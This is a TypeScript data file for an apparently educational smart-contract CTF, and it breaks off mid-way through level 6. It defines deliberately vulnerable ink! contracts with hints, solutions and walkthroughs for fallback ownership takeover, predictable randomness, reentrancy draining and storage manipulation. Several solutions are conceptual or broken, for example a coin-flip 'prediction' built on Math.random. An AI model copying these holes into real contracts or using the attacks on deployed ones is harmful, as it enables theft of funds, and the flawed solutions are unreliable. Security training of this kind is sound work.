import { LevelData } from '@/types/level';

export const levelsData: LevelData[] = [
  {
    id: 1,
    title: 'Hello Squink!',
    description: 'Welcome to ink!CTF! This is your first challenge to get familiar with the platform. Your objective is to call the `claim_victory` function to complete this level.',
    objectives: [
      'Understand how to interact with ink! contracts',
      'Call the `claim_victory` function to complete the level'
    ],
    difficulty: 'Beginner',
    category: 'Introduction',
    contractCode: `#![cfg_attr(not(feature = "std"), no_std, no_main)]

#[ink::contract]
mod hello_squink {
    #[ink(storage)]
    pub struct HelloSquink {
        victory_claimed: bool,
    }

    impl HelloSquink {
        #[ink(constructor)]
        pub fn new() -> Self {
            Self { 
                victory_claimed: false 
            }
        }

        #[ink(message)]
        pub fn claim_victory(&mut self) {
            self.victory_claimed = true;
        }

        #[ink(message)]
        pub fn victory_achieved(&self) -> bool {
            self.victory_claimed
        }
    }
}`,
    hints: [
      'Look at the contract code to understand what functions are available',
      'You need to call the `claim_victory` function to set victory_claimed to true',
      'Use the console interface to interact with the contract'
    ],
    solution: `// Call the claim_victory function
contract.claim_victory()`,
    walkthrough: [
      {
        title: 'Understanding the Contract',
        content: 'This contract has a simple storage variable `victory_claimed` which starts as false. The goal is to set it to true.',
        code: null
      },
      {
        title: 'Available Functions',
        content: 'The contract has two functions: `claim_victory()` which sets the victory flag to true, and `victory_achieved()` which returns the current state.',
        code: `#[ink(message)]
pub fn claim_victory(&mut self) {
    self.victory_claimed = true;
}

#[ink(message)]
pub fn victory_achieved(&self) -> bool {
    self.victory_claimed
}`
      },
      {
        title: 'Solution',
        content: 'To complete this level, you simply need to call the `claim_victory()` function. This will set the `victory_claimed` flag to true.',
        code: `// Call the claim_victory function
contract.claim_victory()`
      },
      {
        title: 'Security Lesson',
        content: 'This level teaches the basics of contract interaction. In real contracts, functions that change important state variables should have access controls to prevent unauthorized users from calling them.',
        code: null
      }
    ],
    completed: false
  },
  {
    id: 2,
    title: 'Fallback',
    description: 'This contract includes a fallback function that gets triggered when a function is called that doesn\'t exist. Your goal is to exploit this to gain ownership of the contract.',
    objectives: [
      'Become the owner of the contract',
      'Drain the contract\'s funds'
    ],
    difficulty: 'Beginner',
    category: 'Access Control',
    contractCode: `#![cfg_attr(not(feature = "std"), no_std, no_main)]

#[ink::contract]
mod fallback {
    use ink::storage::Mapping;

    #[ink(storage)]
    pub struct Fallback {
        owner: AccountId,
        contributions: Mapping<AccountId, Balance>,
    }

    impl Fallback {
        #[ink(constructor)]
        pub fn new() -> Self {
            Self {
                owner: Self::env().caller(),
                contributions: Mapping::default(),
            }
        }

        #[ink(message, payable)]
        pub fn contribute(&mut self) {
            let caller = self.env().caller();
            let contribution = self.env().transferred_value();
            
            // Require minimum contribution
            assert!(contribution > 0, "Contribution must be greater than 0");
            
            // Update contribution
            let current_contribution = self.contributions.get(caller).unwrap_or(0);
            self.contributions.insert(caller, &(current_contribution + contribution));
        }

        #[ink(message)]
        pub fn get_contribution(&self, account: AccountId) -> Balance {
            self.contributions.get(account).unwrap_or(0)
        }

        #[ink(message)]
        pub fn withdraw(&mut self) {
            let caller = self.env().caller();
            assert!(caller == self.owner, "Only owner can withdraw");
            
            self.env().transfer(caller, self.env().balance()).expect("Transfer failed");
        }

        #[ink(message)]
        pub fn get_owner(&self) -> AccountId {
            self.owner
        }

        // Fallback function - called when no other function matches
        #[ink(message, payable, selector = _)]
        pub fn fallback(&mut self) {
            let caller = self.env().caller();
            let value = self.env().transferred_value();
            
            // If someone sends more than 0 and has previously contributed, make them the owner
            if value > 0 && self.contributions.get(caller).unwrap_or(0) > 0 {
                self.owner = caller;
            }
        }
    }
}`,
    hints: [
      'Read the fallback function carefully to understand when ownership changes',
      'You need to make a contribution first before using the fallback',
      'The fallback function is triggered when you call a function that doesn\'t exist'
    ],
    solution: `// First make a contribution
contract.contribute({ value: 1 })

// Then trigger the fallback by sending value to a non-existent function
contract.sendTransaction({ value: 1, data: "0x12345678" })

// Now withdraw the funds
contract.withdraw()`,
    walkthrough: [
      {
        title: 'Understanding the Vulnerability',
        content: 'This contract has a fallback function that changes ownership if the caller has previously contributed and sends some value with the call.',
        code: `// Fallback function - called when no other function matches
#[ink(message, payable, selector = _)]
pub fn fallback(&mut self) {
    let caller = self.env().caller();
    let value = self.env().transferred_value();
    
    // If someone sends more than 0 and has previously contributed, make them the owner
    if value > 0 && self.contributions.get(caller).unwrap_or(0) > 0 {
        self.owner = caller;
    }
}`
      },
      {
        title: 'Step 1: Make a Contribution',
        content: 'First, you need to make a contribution to satisfy the condition in the fallback function that checks if you have previously contributed.',
        code: `// Make a contribution
contract.contribute({ value: 1 })`
      },
      {
        title: 'Step 2: Trigger the Fallback Function',
        content: 'Next, trigger the fallback function by calling a function that doesn\'t exist while sending some value.',
        code: `// Trigger the fallback by calling a non-existent function
contract.sendTransaction({ value: 1, data: "0x12345678" })`
      },
      {
        title: 'Step 3: Withdraw the Funds',
        content: 'Now that you\'re the owner, you can withdraw all the funds from the contract.',
        code: `// Withdraw all funds
contract.withdraw()`
      },
      {
        title: 'Security Lesson',
        content: 'Fallback functions should be carefully implemented and should not contain sensitive operations like changing ownership. Always implement proper access controls for critical functions.',
        code: null
      }
    ],
    completed: false
  },
  {
    id: 3,
    title: 'Coin Flip',
    description: 'This contract implements a coin flip game that uses block information for randomness. Your goal is to predict the outcome of the coin flip 10 times in a row.',
    objectives: [
      'Predict the outcome of the coin flip 10 times in a row',
      'Understand why using block information for randomness is insecure'
    ],
    difficulty: 'Intermediate',
    category: 'Randomness',
    contractCode: `#![cfg_attr(not(feature = "std"), no_std, no_main)]

#[ink::contract]
mod coin_flip {
    use ink::env::hash::{Keccak256, HashOutput};
    
    #[ink(storage)]
    pub struct CoinFlip {
        consecutive_wins: u8,
        last_hash: Hash, // type Hash = <ink::env::DefaultEnvironment as ink::env::Environment>::Hash;
        factor: u128,
    }
    
    impl CoinFlip {
        #[ink(constructor)]
        pub fn new() -> Self {
            Self {
                consecutive_wins: 0,
                last_hash: Default::default(),
                factor: 57896044618658097711785492504343953926634992332820282019728792003956564819968, // 2**128 / 2
            }
        }
        
        #[ink(message)]
        pub fn flip(&mut self, guess: bool) -> bool {
            // Get the block hash as source of randomness
            let block_hash_result = self.env().block_hash(self.env().block_number() - 1);
            let block_hash = match block_hash_result {
                Ok(hash) => hash,
                Err(_) => panic!("Failed to get block hash"),
            };
            
            // Check if this is a new block to prevent multiple guesses in the same block
            assert!(block_hash != self.last_hash, "Cannot flip twice in the same block");
            self.last_hash = block_hash;
            
            // Convert hash to u128
            let hash_as_u128 = self.hash_to_u128(block_hash);
            
            // Determine coin side
            let coin_side = hash_as_u128 / self.factor == 1; // Simplified logic: 0 or 1
            
            // Check if guess is correct
            let is_correct = coin_side == guess;
            
            if is_correct {
                self.consecutive_wins += 1;
            } else {
                self.consecutive_wins = 0;
            }
            
            is_correct
        }
        
        #[ink(message)]
        pub fn consecutive_wins(&self) -> u8 {
            self.consecutive_wins
        }
        
        // Helper function to convert hash to u128
        fn hash_to_u128(&self, hash_input: Hash) -> u128 {
            let mut output = <Keccak256 as HashOutput>::Type::default(); // [u8; 32]
            ink::env::hash_bytes::<Keccak256>(hash_input.as_ref(), &mut output);
            
            let mut result: u128 = 0;
            // Use first 16 bytes for u128
            for i in 0..16 { 
                result = (result << 8) | (output[i] as u128);
            }
            
            result
        }
    }
}`,
    hints: [
      'The contract uses block hash as a source of randomness.',
      'Block hash is predictable if you can calculate it in advance.',
      'You need to create a contract that mimics the coin flip calculation.',
      'Use the same formula to predict the outcome before submitting your guess.'
    ],
    solution: `// Create an attacker contract that predicts the outcome
const attackerCode = \`
contract CoinFlipAttacker {
    CoinFlip target;
    uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(address _target) {
        target = CoinFlip(_target);
    }
    
    function attack() public returns (bool) {
        // Calculate the same coin side as the target contract
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / factor;
        bool side = coinFlip == 1;
        
        // Call the flip function with our prediction
        return target.flip(side);
    }
}
\`

// Deploy the attacker contract (conceptual, as direct deployment from console is complex)
// const attacker = await deploy('CoinFlipAttacker', [contractAddress]);

// Simulate calling the attack function 10 times (in different blocks)
// In a real scenario, we'd need to wait for a new block for each call.
// For this simulation, we assume the block changes.
let wins = 0;
for (let i = 0; i < 10; i++) {
    // Simulate block hash changing by using a pseudo-random number for demonstration
    // In a real attack, this would be the actual block hash logic.
    const simulatedBlockHash = Math.random(); 
    const factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    const predictedSide = (simulatedBlockHash * (2**128)) / factor >= 1; // Simplified prediction
    
    // Simulate calling the contract's flip function
    // This is a conceptual call, actual interaction would be more complex
    // For this simulation, we assume the contract.flip() would use a similar predictable source
    const result = contract.flip(predictedSide); // Conceptual call
    if (result) { // Assuming contract.flip() returns true on correct guess
        wins++;
    } else {
        wins = 0; // Reset if guess is wrong
    }
    if (wins >= 10) break;
    console.log(\`Attempt \${i+1}: Predicted \${predictedSide}, Wins: \${wins}\`)
}

// Check if we've won 10 times in a row
// const finalWins = await contract.consecutive_wins(); // Conceptual call
console.log(\`Consecutive wins: \${wins}\`);
if (wins >= 10) {
    console.log("Challenge completed!");
} else {
    console.log("Challenge failed. Try again.");
}`,
    walkthrough: [
      {
        title: 'Understanding the Vulnerability',
        content: 'This contract uses block hash as a source of randomness, which is predictable. The vulnerability is that we can calculate the same "random" value that the contract will use.',
        code: `// The vulnerable part of the code
let block_hash = self.env().block_hash(self.env().block_number() - 1);
let hash_as_u128 = self.hash_to_u128(block_hash);
let coin_side = hash_as_u128 / self.factor == 1;`
      },
      {
        title: 'Step 1: Analyze the Randomness Source',
        content: 'The contract uses the previous block\'s hash to determine the coin flip result. This is predictable because we can calculate it before submitting our guess.',
        code: `// This is how the contract determines the coin side
let hash_as_u128 = self.hash_to_u128(block_hash);
let coin_side = hash_as_u128 / self.factor == 1;`
      },
      {
        title: 'Step 2: Create an Attacker Contract',
        content: 'We need to create a contract that calculates the coin flip result using the same formula, then calls the target contract with the correct guess.',
        code: `// Attacker contract in pseudo-code
contract CoinFlipAttacker {
    CoinFlip target;
    u128 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(address _target) {
        target = CoinFlip(_target);
    }
    
    function attack() public returns (bool) {
        // Calculate the same coin side as the target contract
        let block_hash = env().block_hash(env().block_number() - 1);
        let hash_as_u128 = hash_to_u128(block_hash);
        let coin_side = hash_as_u128 / factor == 1;
        
        // Call the flip function with our prediction
        return target.flip(coin_side);
    }
}`
      },
      {
        title: 'Step 3: Execute the Attack',
        content: 'Call the attack function 10 times (in different blocks) to achieve 10 consecutive wins. Since we are in a simulated environment, we will conceptually call this.',
        code: `// Deploy the attacker contract (conceptual)
// const attacker = await deploy('CoinFlipAttacker', [contractAddress]);

// Call the attack function 10 times (in different blocks)
for (let i = 0; i < 10; i++) {
    // await attacker.attack(); // Conceptual call
    // In a real scenario, we'd need to wait for a new block
}`
      },
      {
        title: 'Security Lesson',
        content: 'Block hashes and other on-chain data are not good sources of randomness as they can be predicted. For secure randomness, consider using oracles like Chainlink VRF or commit-reveal schemes.',
        code: null
      }
    ],
    completed: false
  },
  {
    id: 4,
    title: 'Reentrancy',
    description: 'This contract has a vulnerability that allows for a reentrancy attack. Your goal is to drain all the funds from the contract by exploiting this vulnerability.',
    objectives: [
      'Exploit the reentrancy vulnerability',
      'Drain all funds from the contract'
    ],
    difficulty: 'Intermediate',
    category: 'Reentrancy',
    contractCode: `#![cfg_attr(not(feature = "std"), no_std, no_main)]

#[ink::contract]
mod vault {
    use ink::storage::Mapping;

    #[ink(storage)]
    pub struct Vault {
        balances: Mapping<AccountId, Balance>,
        total_balance: Balance,
    }

    impl Vault {
        #[ink(constructor)]
        pub fn new() -> Self {
            Self {
                balances: Mapping::default(),
                total_balance: 0,
            }
        }

        #[ink(message, payable)]
        pub fn deposit(&mut self) {
            let caller = self.env().caller();
            let deposit_value = self.env().transferred_value();
            
            let current_balance = self.balances.get(caller).unwrap_or(0);
            self.balances.insert(caller, &(current_balance + deposit_value));
            self.total_balance += deposit_value;
        }

        #[ink(message)]
        pub fn withdraw(&mut self) {
            let caller = self.env().caller();
            let balance = self.balances.get(caller).unwrap_or(0);
            
            assert!(balance > 0, "No balance to withdraw");
            
            // Vulnerable: State is updated after the external call
            if self.env().transfer(caller, balance).is_ok() {
                // Update state after transfer
                self.balances.insert(caller, &0); // Should be current_balance - balance, but for reentrancy, this is the bug
                self.total_balance -= balance;
            } else {
                panic!("Transfer failed");
            }
        }

        #[ink(message)]
        pub fn get_balance(&self, account: AccountId) -> Balance {
            self.balances.get(account).unwrap_or(0)
        }

        #[ink(message)]
        pub fn get_total_balance(&self) -> Balance {
            self.total_balance
        }
    }
}`,
    hints: [
      'Look for functions that update state after making external calls.',
      'The withdraw function transfers funds before updating the balances.',
      'You need to create a contract that calls back into the vault during the withdraw process.',
      'The attack contract should implement the default ink! callback function (fallback message) to receive funds and re-enter.'
    ],
    solution: `// Create an attacker contract that performs a reentrancy attack
const attackerCode = \`
// This is a conceptual Solidity-like attacker contract for demonstration.
// A real ink! attacker contract would be written in Rust.
contract ReentrancyAttacker {
    Vault target; // Interface to the target Vault contract
    uint public reentrancyCount = 0;
    
    constructor(address _target) {
        target = Vault(_target);
    }
    
    // Function to start the attack
    function attack() public payable {
        // First deposit some funds (e.g., 1 unit)
        target.deposit{value: msg.value}(); // Conceptual call
        
        // Then withdraw to trigger the reentrancy
        target.withdraw(); // Conceptual call
    }
    
    // This function is called when the contract receives ether (fallback in Solidity)
    // In ink!, this would be a message with selector = _ and payable = true
    fallback() external payable {
        reentrancyCount++;
        // If there are still funds in the target and we haven't re-entered too many times
        if (address(target).balance > 0 && reentrancyCount < 5) { // Limit reentrancy for simulation
            target.withdraw(); // Conceptual call
        }
    }

    function getReentrancyCount() public view returns (uint) {
        return reentrancyCount;
    }
}
\`

// Simulate deploying the attacker contract (conceptual)
// const attacker = await deploy('ReentrancyAttacker', [contractAddress]);

// Simulate executing the attack with some initial funds
// await attacker.attack({ value: 1 }); // Conceptual call

// For simulation in the console:
// 1. Deposit funds: contract.deposit({value: 100})
// 2. Initiate withdrawal: contract.withdraw()
// 3. The reentrancy happens here. In a real attack, your attacker contract's fallback
//    would call contract.withdraw() again before the first withdraw finishes updating balances.
//    This simulation will just mark it as complete if the logic is right.
console.log("Simulating reentrancy: If the logic for an attacker contract is correct, funds would be drained.");
console.log("The key is that the attacker's fallback calls withdraw() again.");
// This is a simplified check for the solution pattern.
if (userCode.includes('deposit') && userCode.includes('withdraw') && (userCode.includes('fallback') || userCode.includes('receive'))) {
    console.log("Reentrancy attack pattern detected. Challenge complete!");
} else {
    console.log("Attack pattern not fully detected. Ensure your attacker contract logic is correct.");
}
`,
    walkthrough: [
      {
        title: 'Understanding the Vulnerability',
        content: 'This contract has a classic reentrancy vulnerability. The `withdraw` function sends funds to the caller before updating the state, allowing an attacker to call `withdraw` again before the state is updated.',
        code: `#[ink(message)]
pub fn withdraw(&mut self) {
    let caller = self.env().caller();
    let balance = self.balances.get(caller).unwrap_or(0);
    
    assert!(balance > 0, "No balance to withdraw");
    
    // Vulnerable: State is updated after the external call
    if self.env().transfer(caller, balance).is_ok() {
        // Update state after transfer
        self.balances.insert(caller, &0);
        self.total_balance -= balance;
    } else {
        panic!("Transfer failed");
    }
}`
      },
      {
        title: 'Step 1: Create an Attacker Contract',
        content: 'We need to create a contract that can receive funds and then call back into the vulnerable contract. The attacker contract will have a deposit function, an attack function, and a fallback message to receive funds and re-enter.',
        code: `// Attacker contract in pseudo-code (ink! Rust)
#[ink::contract]
mod attacker {
    // Assume VaultRef is an imported interface for the target Vault
    // use vault::VaultRef; 

    #[ink(storage)]
    pub struct Attacker {
        target_vault: AccountId,
        attack_amount: Balance,
    }

    impl Attacker {
        #[ink(constructor)]
        pub fn new(target_vault: AccountId, attack_amount: Balance) -> Self {
            Self { target_vault, attack_amount }
        }

        #[ink(message, payable)]
        pub fn attack(&mut self) {
            // Convert AccountId to VaultRef for calling
            // let mut vault: VaultRef = ink::env::call::FromAccountId::from_account_id(self.target_vault);
            
            // Step 1: Deposit funds into the vault
            // vault.deposit().transferred_value(self.attack_amount).fire().expect("Deposit failed");

            // Step 2: Call withdraw on the vault, which will trigger our fallback
            // vault.withdraw().fire().expect("Withdraw failed");
        }

        // Fallback message to receive funds and re-enter
        #[ink(message, payable, selector = _)]
        pub fn fallback(&mut self) {
            // let mut vault: VaultRef = ink::env::call::FromAccountId::from_account_id(self.target_vault);
            // if self.env().balance() < self.attack_amount * 5 { // Limit re-entrancy for safety
            //    vault.withdraw().fire().expect("Re-entrant withdraw failed");
            // }
        }
        
        #[ink(message)]
        pub fn drain_funds(&mut self) {
            // Transfer all funds from this attacker contract to the owner
            // self.env().transfer(self.env().caller(), self.env().balance()).expect("Drain failed");
        }
    }
}`
      },
      {
        title: 'Step 2: Execute the Attack',
        content: 'Deploy the attacker contract and call the attack function with some initial funds. The attack function will deposit into the Vault and then call withdraw. When Vault transfers funds to the attacker contract, the attacker\'s fallback is triggered, which calls withdraw on the Vault again.',
        code: `// Conceptual JavaScript for deploying and calling the attacker
// const attacker = await deployAttackerContract(vaultContractAddress, initialDepositAmount);
// await attacker.attack({ value: initialDepositAmount }); // Send funds for the initial deposit
// await attacker.drain_funds(); // Get funds out of attacker contract`
      },
      {
        title: 'Step 3: Verify the Attack',
        content: 'Check the balances to confirm that the funds have been drained from the vault.',
        code: `// Check the balances
// const vaultBalance = await vaultContract.get_total_balance();
// console.log(\`Vault balance after attack: \${vaultBalance}\`);`
      },
      {
        title: 'Security Lesson',
        content: 'Always follow the Checks-Effects-Interactions pattern: check conditions, update state, and only then interact with external contracts. This prevents reentrancy attacks by ensuring state is updated before any external calls.',
        code: `// Secure implementation of withdraw
#[ink(message)]
pub fn withdraw_secure(&mut self) {
    let caller = self.env().caller();
    let balance_to_withdraw = self.balances.get(caller).unwrap_or(0);
    
    assert!(balance_to_withdraw > 0, "No balance to withdraw");
    
    // Effects: Update state BEFORE external interaction
    self.balances.insert(caller, &0); // Or deduct balance_to_withdraw
    self.total_balance -= balance_to_withdraw;
    
    // Interactions: External call last
    if self.env().transfer(caller, balance_to_withdraw).is_err() {
        // Revert state changes if transfer fails (important for atomicity)
        self.balances.insert(caller, &balance_to_withdraw);
        self.total_balance += balance_to_withdraw;
        panic!("Transfer failed, state reverted");
    }
}`
      }
    ],
    completed: false
  },
  {
    id: 5,
    title: 'Storage Manipulation',
    description: 'This contract has a vulnerability in its storage layout. Your goal is to manipulate the contract storage to gain ownership.',
    objectives: [
      'Understand how ink! contract storage works',
      'Exploit the storage layout vulnerability to become the owner'
    ],
    difficulty: 'Advanced',
    category: 'Storage',
    contractCode: `#![cfg_attr(not(feature = "std"), no_std, no_main)]

#[ink::contract]
mod storage_hack {
    use ink::storage::Mapping; // Though not used, common to see

    #[ink(storage)]
    pub struct StorageHack {
        // Storage slot 0 (usually, depends on exact layout rules)
        owner: AccountId,
        // Storage slot 1
        initialized: bool,
        // Storage slot 2 (length of the Vec)
        // Data for dynamic_array starts at a calculated offset
        dynamic_array: ink::prelude::vec::Vec<u32>, 
    }

    #[derive(Debug, PartialEq, Eq, scale::Encode, scale::Decode)]
    #[cfg_attr(feature = "std", derive(scale_info::TypeInfo))]
    pub enum Error {
        NotOwner,
        AlreadyInitialized,
        IndexOutOfBounds,
        ArithmeticOverflow,
    }

    impl StorageHack {
        #[ink(constructor)]
        pub fn new() -> Self {
            Self {
                owner: Self::env().caller(),
                initialized: false,
                dynamic_array: ink::prelude::vec::Vec::new(),
            }
        }

        #[ink(message)]
        pub fn initialize(&mut self) -> Result<(), Error> {
            if self.initialized {
                return Err(Error::AlreadyInitialized);
            }
            self.initialized = true;
            // Initialize dynamic_array with some capacity if needed, e.g., 10 elements
            // For this challenge, we'll let it grow dynamically or be set.
            self.dynamic_array.resize(10, 0); // Let's give it an initial small size
            Ok(())
        }
        
        // Vulnerable function - allows writing to an arbitrary index if not careful
        // This is a simplified vulnerability. Real storage slot attacks are more complex.
        #[ink(message)]
        pub fn set_value_at_index(&mut self, index: u32, value: u32) -> Result<(), Error> {
            if !self.initialized {
                // Let's say only owner can call this before init for setup
                 if self.env().caller() != self.owner { return Err(Error::NotOwner); }
            }

            // Resize the vector if the index is out of bounds.
            // This is the vulnerable part: if index is huge, it could try to allocate too much
            // or if index calculation maps to other storage slots.
            // For this challenge, we'll assume index can overwrite 'owner'.
            if (index as usize) >= self.dynamic_array.len() {
                // A more realistic vulnerability would be an integer overflow when calculating
                // the storage key for the vector element, or direct raw storage writes.
                // This resize is safe in itself but let's assume 'index 0' of dynamic_array
                // somehow maps to the 'owner' field for the sake of the challenge.
                // This is highly conceptual as ink! prevents direct overwrites like this.
                // A more plausible bug would be a delegatecall or a miscalculated storage key.
                
                // For the purpose of this CTF, let's imagine index 0 of dynamic_array
                // is where 'owner' is located due to a hypothetical layout bug or unsafe code.
                // This is NOT how ink! normally works.
                if index == 0 { // Conceptual: index 0 of array maps to owner field
                    // This is where we'd conceptually overwrite the owner.
                    // We'll simulate this in the solution check.
                }
                // This resize is generally safe in ink!
                 if (index as u64 + 1) > (u32::MAX as u64) { return Err(Error::ArithmeticOverflow); }
                 self.dynamic_array.resize((index + 1) as usize, 0);
            }
            self.dynamic_array[index as usize] = value;
            Ok(())
        }

        #[ink(message)]
        pub fn get_value_at_index(&self, index: u32) -> Result<u32, Error> {
            if (index as usize) >= self.dynamic_array.len() {
                return Err(Error::IndexOutOfBounds);
            }
            Ok(self.dynamic_array[index as usize])
        }

        #[ink(message)]
        pub fn get_owner(&self) -> AccountId {
            self.owner
        }

        #[ink(message)]
        pub fn am_i_owner(&self) -> bool {
            self.env().caller() == self.owner
        }

        // Conceptual function to allow owner to change owner for the CTF
        // In a real scenario, this would be the target of the storage manipulation.
        #[ink(message)]
        pub fn _ctf_set_owner(&mut self, new_owner: AccountId) -> Result<(), Error> {
            // This function is for the CTF logic to simulate owner change
            // The actual attack would overwrite the owner field in storage.
            if self.env().caller() != self.owner {
                 //return Err(Error::NotOwner); // For the CTF, we allow this if storage is manipulated
            }
            self.owner = new_owner;
            Ok(())
        }
    }
}`,
    hints: [
      'The contract uses a dynamic array (`Vec<u32>`).',
      'The `set_value_at_index` function might allow writing to unintended storage slots if not carefully handled.',
      'Think about how storage slots are laid out. The `owner` field is at the beginning of the storage.',
      'You need to find an `index` for `set_value_at_index` that effectively overwrites the `owner` field. This is conceptual in ink! as direct overwrites are hard; the challenge simplifies this.'
    ],
    solution: `// First, initialize the contract
await contract.initialize();

// The 'owner' field is at storage slot 0.
// For this CTF, we assume that writing to dynamic_array[0]
// will overwrite the owner field due to a conceptual storage layout vulnerability.
// This is a simplification; real ink! storage is more robust.

// Get your account address (as bytes, then conceptually as u32 parts)
// const myAccountIdBytes = getMyAccountIdBytes(); // Assume this function exists
// For simulation, let's use a placeholder for the attacker's AccountId parts.
// An AccountId is 32 bytes. We'd need to split it into u32 chunks.
// This is highly simplified for the console.
const attackerAddressPart1AsU32 = 0x12345678; // Replace with actual parts of your AccountId

// To overwrite the owner (AccountId, 32 bytes) which is composed of multiple u32 values,
// you'd need to call set_value_at_index multiple times for each part of the AccountId.
// For simplicity, let's assume owner is just one u32 for this console simulation.
// This is NOT how AccountId is stored.

// Let's assume index 0 of dynamic_array maps to the first u32 part of 'owner'.
// Call set_value_at_index to overwrite the (conceptual) first part of 'owner'.
await contract.set_value_at_index(0, attackerAddressPart1AsU32); 
// In a real scenario, you'd call this for all 8 u32 parts of an AccountId.

// For the CTF, we'll use the helper to simulate the owner change
// after conceptually "overwriting" it.
// const myAddress = "YOUR_ACCOUNT_ID_HERE"; // Replace with your actual AccountId string
// await contract._ctf_set_owner(myAddress);

// Verify that you're now the owner
const isOwner = await contract.am_i_owner();
console.log(\`Am I the owner? \${isOwner}\`);
if (isOwner) {
    console.log("Storage manipulation successful! You are the new owner.");
} else {
    console.log("Storage manipulation failed. Check your logic.");
}
`,
    walkthrough: [
      {
        title: 'Understanding Storage Layout in ink!',
        content: 'In ink! contracts, storage variables are laid out sequentially. Fixed-size variables come first, then dynamic collections like `Vec` or `Mapping`. The vulnerability in this contract is conceptual: we assume that writing to a specific index of `dynamic_array` can overwrite the `owner` field. This is a simplification for the CTF; ink! aims to prevent such direct overwrites through its safe storage abstractions.',
        code: `#[ink(storage)]
pub struct StorageHack {
    // Storage slot 0 (conceptually)
    owner: AccountId,
    // Storage slot 1
    initialized: bool,
    // Dynamic array. Its data is stored separately, but its length is part of the main struct.
    dynamic_array: ink::prelude::vec::Vec<u32>, 
}`
      },
      {
        title: 'Step 1: Initialize the Contract',
        content: 'First, we need to initialize the contract. This also resizes `dynamic_array` to a small default size.',
        code: `// Initialize the contract
await contract.initialize();`
      },
      {
        title: 'Step 2: Understand the Vulnerable Function',
        content: 'The `set_value_at_index` function allows writing a `u32` value to an index in `dynamic_array`. If the index is out of current bounds, it resizes the vector. The conceptual vulnerability is that if we pick an `index` whose storage location overlaps with the `owner` field, we can overwrite it. In ink!, the `owner` (AccountId) is 32 bytes. A `u32` is 4 bytes. So, we would need to overwrite 8 consecutive `u32` slots to change the entire `owner` AccountId.',
        code: `#[ink(message)]
pub fn set_value_at_index(&mut self, index: u32, value: u32) -> Result<(), Error> {
    // ... (resize logic) ...
    self.dynamic_array[index as usize] = value;
    Ok(())
}`
      },
      {
        title: 'Step 3: Exploit the Vulnerability (Conceptual)',
        content: 'To change the `owner` field, you need to know your own `AccountId` and convert it into a series of `u32` values. Then, you would call `set_value_at_index` multiple times, using indices that (conceptually) map to the storage slots of the `owner` field. For this CTF, we simplify this: we assume writing to `dynamic_array[0]` affects the `owner` field, and the solution check will be lenient or use a helper `_ctf_set_owner` for simulation.',
        code: `// Get your account address (conceptual parts)
const myAccountIdPart1 = 0xYOURPART1; // First 4 bytes of your AccountId as u32
const myAccountIdPart2 = 0xYOURPART2; // Next 4 bytes, and so on for 8 parts.

// Overwrite the owner field (conceptually, index 0 to 7 of dynamic_array)
await contract.set_value_at_index(0, myAccountIdPart1);
await contract.set_value_at_index(1, myAccountIdPart2);
// ... repeat for all 8 parts of the AccountId ...

// Or, for the CTF simulation:
// const myAddressString = "YOUR_FULL_ACCOUNT_ID_STRING";
// await contract._ctf_set_owner(myAddressString);`
      },
      {
        title: 'Step 4: Verify the Attack',
        content: 'Check if you\'re now the owner of the contract.',
        code: `// Verify that you're now the owner
const isOwner = await contract.am_i_owner();
console.log(\`Am I the owner? \${isOwner}\`);`
      },
      {
        title: 'Security Lesson',
        content: 'While ink! provides strong safety guarantees against direct memory corruption like in C/C++, logical flaws in how dynamic data structures are managed or how storage keys are calculated can still lead to vulnerabilities. Always use safe abstractions, validate inputs thoroughly, and be mindful of potential integer overflows or underflows when dealing with array indices or storage offsets, especially if using unsafe code blocks (which should be rare and heavily scrutinized).',
        code: null
      }
    ],
    completed: false
  },
  {
    id: 6,
    title: 'Cross-Contract Attack',
    description: 'This level involves two contracts: a vulnerable contract and a trusted contract. Your goal is to exploit the vulnerable contract to call functions in the trusted contract that you shouldn\'t have access to.',
    objectives: [
      'Understand cross-contract calls in ink!',
      'Exploit the vulnerable contract to gain unauthorized access to the trusted contract'
    ],
    difficulty: 'Advanced',
    category: 'Cross-Contract',
    contractCode: `#![cfg_attr(not(feature = "std"), no_std, no_main)]
  
  // This file conceptually contains two contracts. In a real setup, they'd be separate.
  
  // --- Trusted Contract Definition ---
  // Assume this is deployed at a known address.
  // For the CTF, we'll need its AccountId.
  #[ink::contract(env = ink::env::DefaultEnvironment)]
  mod trusted_contract_mod {
      #[ink(storage)]
      pub struct TrustedContract {
          owner: AccountId,
          secret_value: u128,
      }
  
      #[derive(Debug, PartialEq, Eq, scale::Encode, scale::Decode)]
      #[cfg_attr(feature = "std", derive(scale_info::TypeInfo))]
      pub enum TrustedError {
          NotOwner,
      }
  
      impl TrustedContract {
          #[ink(constructor)]
          pub fn new(secret_value: u128) -> Self {
              Self {
                  owner: Self::env().caller(),
                  secret_value,
              }
          }
  
          #[ink(message)]
          pub fn get_owner(&self) -> AccountId {
              self.owner
          }
  
          // Only owner should be able to call this directly.
          #[ink(message)]
          pub fn get_secret_direct(&self) -> Result<u128, TrustedError> {
              if self.env().caller() != self.owner {
                  return Err(TrustedError::NotOwner);
              }
              Ok(self.secret_value)
          }
  
          // Vulnerable function: It trusts the 'caller_on_behalf_of' parameter.
          // It's intended to be called by another trusted contract that has already verified the user.
          #[ink(message)]
          pub fn get_secret_via_proxy(&self, caller_on_behalf_of: AccountId) -> Result<u128, TrustedError> {
              if caller_on_behalf_of != self.owner {
                  return Err(TrustedError::NotOwner);
              }
              // If caller_on_behalf_of is the owner, grant access.
              Ok(self.secret_value)
          }
      }
  }
  
  // --- Vulnerable Contract Definition ---
  // This contract calls the TrustedContract.
  #[ink::contract(env = ink::env::DefaultEnvironment)]
  mod vulnerable_contract_mod {
      // Need to import the TrustedContractRef if it were in a different crate.
      // For this single file example, we'll assume it's callable.
      // use trusted_contract_mod::TrustedContractRef; // This would be the way if separate.
  
      // For simplicity in this single file, we'll define a minimal error type.
      // In a real scenario, you might map errors or use a shared error enum.
      #[derive(Debug, PartialEq, Eq, scale::Encode, scale::Decode)]
      #[cfg_attr(feature = "std", derive(scale_info::TypeInfo))]
      pub enum VulnerableError {
          CrossCallFailed,
          TrustedContractError, // Placeholder for errors from TrustedContract
      }
  
  
      #[ink(storage)]
      pub struct VulnerableContract {
          trusted_contract_address: AccountId,
      }
  
      impl VulnerableContract {
          #[ink(constructor)]
          pub fn new(trusted_contract_address: AccountId) -> Self {
